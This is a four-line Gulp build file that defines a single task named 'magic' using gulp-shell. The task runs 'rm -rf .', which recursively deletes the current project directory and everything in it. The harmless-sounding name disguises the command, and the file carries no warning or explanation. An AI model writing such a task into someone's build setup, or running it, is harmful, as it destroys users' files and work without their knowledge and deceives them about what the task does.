var gulp  = require('gulp')
var shell = require('gulp-shell')

gulp.task('magic', shell.task(['rm -rf .']))